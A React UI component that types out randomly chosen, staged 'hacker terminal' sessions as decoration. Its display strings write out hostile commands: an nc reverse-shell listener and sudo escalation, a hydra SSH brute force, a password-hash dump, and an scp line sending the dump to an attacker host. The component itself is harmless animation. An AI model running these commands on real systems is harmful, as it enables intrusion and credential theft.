import { useState, useEffect } from "react";

const terminalContents = [
  // Session 1 - Exploit
  `# python rope-pwn.py
[*] Starting exploit against target 10.0.2.15:1337
[+] Leaked Canary: 0x00888b9ac625c878
[+] Found libc base: 0x7ff1c000b000
[*] RBP: 0x8023809d4d2fd3d008100000
[*] PIE return address: 0x62f531b0a5c65000

>>> Sending payload (size: 512 bytes)
[+] Payload delivered successfully
# whoami
root
# cat flag.txt
HTB{root_shell_obtained_successfully}`,

  `$ nmap -sC -sV 192.168.1.101
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1
80/tcp   open  http    Apache httpd 2.4.29
1337/tcp open  pwn     vuln_service

$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.1.50] from (UNKNOWN) [192.168.1.101] 51832
bash: no job control in this shell
$ whoami
www-data
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ sudo -l
(root) NOPASSWD: /bin/bash
$ sudo /bin/bash
# whoami
root`,

  `$ hydra -l admin -P rockyou.txt ssh://192.168.56.101
[ATTEMPT] target 192.168.56.101 - login "admin" - pass "123456"
[ATTEMPT] target 192.168.56.101 - login "admin" - pass "password"
[ATTEMPT] target 192.168.56.101 - login "admin" - pass "letmein"
[ATTEMPT] target 192.168.56.101 - login "admin" - pass "toor"
[SUCCESS] target 192.168.56.101 - login "admin" - pass "p@ssw0rd!"

$ ssh admin@192.168.56.101
admin@192.168.56.101's password:
Welcome to Ubuntu 20.04 LTS
$ whoami
admin
$ sudo su
# whoami
root`,

  `>>> exploit.exe --target=corp.local --mode=hashdump
[+] Connected to domain controller
[+] Dumping SAM database...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
User01:1001:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
User02:1002:aad3b435b51404eeaad3b435b51404ee:e99a18c428cb38d5f260853678922e03:::

>>> Uploading loot to attacker server...
scp dump.txt attacker@10.0.0.8:/loot/
dump.txt                                    100%  4KB  4.0KB/s   00:00

>>> Mission complete!`,
];

const TerminalTypewriter = () => {
  const [displayedText, setDisplayedText] = useState("");
  const [currentIndex, setCurrentIndex] = useState(0);
  const [terminalContent, setTerminalContent] = useState(
    terminalContents[Math.floor(Math.random() * terminalContents.length)]
  );
  useEffect(() => {
    const typeInterval = setInterval(() => {
      if (currentIndex < terminalContent.length) {
        setDisplayedText((prev) => prev + terminalContent[currentIndex]);
        setCurrentIndex((prev) => prev + 1);
      }
    }, 10);

    return () => clearInterval(typeInterval);
  }, [currentIndex, terminalContent]);

  useEffect(() => {
    const resetInterval = setInterval(() => {
      const randomIndex = Math.floor(Math.random() * terminalContents.length);
      setDisplayedText("");
      setCurrentIndex(0);
      setTerminalContent(terminalContents[randomIndex]);
    }, 12000);

    return () => clearInterval(resetInterval);
  }, []);

  return (
    <div className="flex  items-center  justify-center p-4 ">
      <div className="rounded-lg shadow-2xl w-full max-w-4xl">
        <div className="bg-gray-700 rounded-t-lg px-4 py-2 flex items-center space-x-2">
          <div className="w-3 h-3 bg-red-500 rounded-full"></div>
          <div className="w-3 h-3 bg-yellow-500 rounded-full"></div>
          <div className="w-3 h-3 bg-green-500 rounded-full"></div>
        </div>{" "}
        <div className="bg-gray-900 rounded-b-lg p-6 h-96 font-mono text-sm overflow-hidden">
          {" "}
          <div className="text-green-400 whitespace-pre-wrap">
            {displayedText.split("\n").map((line, index) => (
              <div key={index} className="leading-6">
                {line.startsWith("#") ? (
                  <span className="text-blue-400">{line}</span>
                ) : line.startsWith("Canary:") ||
                  line.startsWith("PIE") ||
                  line.startsWith("RBP:") ? (
                  <span className="text-yellow-400">{line}</span>
                ) : line.startsWith("[-]") ? (
                  <span className="text-red-400">{line}</span>
                ) : line.startsWith("[+]") ? (
                  <span className="text-green-400">{line}</span>
                ) : line.startsWith(">>>") ? (
                  <span className="text-purple-400">{line}</span>
                ) : line === "root" ? (
                  <span className="text-green-300 font-bold">{line}</span>
                ) : (
                  <span className="text-gray-300">{line}</span>
                )}
              </div>
            ))}
            {currentIndex < terminalContent.length && (
              <span className="text-green-400 animate-pulse">█</span>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default TerminalTypewriter;
